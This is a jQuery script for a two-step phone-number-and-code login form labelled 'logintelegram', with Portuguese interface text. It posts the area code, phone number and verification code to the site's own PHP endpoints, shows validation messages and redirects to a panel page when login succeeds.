$(document).ready(function(){

    $('#submeter').click(function() {

        $('#logintelegram').submit();
    });

    $('.anterior').click(function() {

		$("#etapa1").animate({"opacity":"1", "z-index":"10"});
		$("#etapa2").animate({"opacity":"0", "z-index":"9"});
		$('.login_head_logo_link').css('display','block');
		$('.anterior').css('display','none');
		$('#submeter').html('Próxima');


		var etapa1 = "inc/etapa-1.php";
		$('#etapa1').load(etapa1);
    });

    $('#reenviarcodigo').click(function() {

    	$('#reenviarcodigo').html('Reenviando código <i class="aguarde"></i>');

        var ddd=$('#ddd').val();
		var telefone=$('#telefone').val();

		$.ajax({

			url:"inc/validarlogin.php",			
			type:"post",				
			data: "ddd="+ddd+"&telefone="+telefone,	
   			success: function (result){

   				if(result==1){

					$('#reenviarcodigo').html('<i class="fa fa-envelope"></i> Código reenviado');
					$('input#codigo').focus();

					setTimeout(function () {

						$('#reenviarcodigo').html('Reenviar código');

					}, 3000);
				
            	}

				if(result==4){
				
					alert('Problemas no reenvio!');

				}

   			}


		})


    });

	$('#logintelegram').submit(function(){ 	
 

		var ddd=$('#ddd').val();
		var telefone=$('#telefone').val();
		var codigo=$('#codigo').val();
		var etapa1=$('#inputetapa1').val();
		var etapa2=$('#inputetapa2').val();

		if(ddd != '' && telefone != '' && etapa1 == '1'){

			$('#submeter').html('Próxima <i class="proxima"></i>');
			$('#carregando').css({ opacity: 0 });

			$('span#alertaddd').css('color', '#868e96').html('DDD').fadeIn("fast");
			$('#dddlinha').css({'background-color':'#bdc1c5', 'height':'1px'});

			$('span#alertatelefone').css('color', '#868e96').html('Número de telefone').fadeIn("fast");
			$('#telefonelinha').css({'background-color':'#bdc1c5', 'height':'1px'});

		}

		if(etapa1 == '1'){


			$.ajax({			
			url:"inc/validarlogin.php",			
			type:"post",				
			data: "ddd="+ddd+"&telefone="+telefone,	
   			success: function (result){		

            if(result==1){


				/*$('#etapa1').css({'position':'relative', 'left':'-100%', 'display':'none'}).fadeOut("fast");
				$('#etapa2').css({'position':'relative', 'right':'0%', 'display':'block'}).fadeIn("fast");*/

				$("#etapa1").animate({"opacity":"0", "z-index":"9"});
				$("#etapa2").animate({"opacity":"1", "z-index":"10"});

				$('.panel').css('padding-bottom', '0px');

				$('.login_head_logo_link').css('display','none');
				$('.anterior').css('display','block');/**/

				$('input#codigo').focus();
				//$('input#codigo').focus().css('z-index','10');

				$('#inputetapa1').prop('value', '');
				$('#inputetapa2').prop('value', '2');
				$('#numero').html(ddd+''+telefone);
				$('#submeter').html('Confirma');
									 
				$('#carregando').css({ opacity: 1 });
            }

			if(result==2){
				$('span#alertaddd').css('color', '#e2726f').html('Digite o DDD').fadeIn("fast");
				$('#dddlinha').css({'background-color':'#e2726f', 'height':'2px'});
				$('input#ddd').focus();

				return false;

			} else {

				$('span#alertaddd').css('color', '#868e96').html('DDD').fadeIn("fast");
				$('#dddlinha').css({'background-color':'#bdc1c5', 'height':'1px'});
			}
				
			if(result==3){
				$('span#alertatelefone').css('color', '#e2726f').html('Informe o número de telefone').fadeIn("fast");
				$('#telefonelinha').css({'background-color':'#e2726f', 'height':'2px'});
				$('input#telefone').focus();
				return false;

			} else {

				$('span#alertatelefone').css('color', '#868e96').html('Número de telefone').fadeIn("fast");
				$('#telefonelinha').css({'background-color':'#bdc1c5', 'height':'1px'});
			}
				
			 if(result==4){

			 	$('#submeter').html('Próxima');
				$('#carregando').css({ opacity: 1 });
				
				$('span#alertaddd').css('color', '#868e96').html('DDD').fadeIn("fast");
				$('#dddlinha').addClass('underline').prop('style', '');

				$('span#alertatelefone').css('color', '#868e96').html('Número de telefone').fadeIn("fast");
				$('#telefonelinha').addClass('underline').prop('style', '');

				$('.form-input input').removeClass('has-content')


				$(".mensagem").animate({opacity:0});
				$(".mensagem2").animate({opacity:1})
			
				var segundos = 8;
				setTimeout(function(){ 
				$(".mensagem").animate({opacity:1});
				$(".mensagem2").animate({opacity:0});
				}, segundos*1000);
			

				$('input#ddd').val("");
				$('input#telefone').val("");
				$('input#ddd').focus();

			}

			if(result==5){

			 	$('#submeter').html('Próxima');
				$('#carregando').css({ opacity: 1 });
				
				$('span#alertaddd').css('color', '#868e96').html('DDD').fadeIn("fast");
				$('#dddlinha').addClass('underline').prop('style', '');

				$('span#alertatelefone').css('color', '#868e96').html('Número de telefone').fadeIn("fast");
				$('#telefonelinha').addClass('underline').prop('style', '');

				$('.form-input input').removeClass('has-content')


				$(".mensagem").animate({opacity:0});
				$(".mensagem3").animate({opacity:1})
			
				var segundos = 8;
				setTimeout(function(){ 
				$(".mensagem").animate({opacity:1});
				$(".mensagem3").animate({opacity:0});
				}, segundos*1000);
			

				$('input#ddd').val("");
				$('input#telefone').val("");
				$('input#ddd').focus();

			}

            }
		})
		return false;


		}

		if(etapa2 == '2'){

			if(codigo != '' && etapa2 == '2'){

				$('#submeter').html('Aguarde <i class="proxima"></i>');
				$('#carregando').css({ opacity: 0 });

			}


			$.ajax({			
			url:"inc/validarlogin2.php",			
			type:"post",				
			data: "ddd="+ddd+"&telefone="+telefone+"&codigo="+codigo,	
   			success: function (result){		

	            if(result==1){

					setTimeout(function () {

						location.href='painel.php';

					}, 0);
					
	            }

				if(result==2){
					$('span#alertacodigo').css({'color':'#e2726f'}).html('O Código não foi informado').fadeIn("fast");
					$('#codigolinha').css({'background-color':'#e2726f', 'height':'2px'});
					$('input#codigo').focus();
					return false;

				} 

				if(result==3){
					$('span#alertacodigo').css({'color':'#e2726f'}).html('O Código digitado é inválido').fadeIn("fast");
					$('#codigolinha').css({'background-color':'#e2726f', 'height':'2px'});
					$('input#codigo').val("");
					$('input#codigo').focus();

					$('#submeter').html('Próxima');
					$('#carregando').css({ opacity: 1 });
					return false;

				} 
				
            }
		})
		return false;

		}

			
	})
})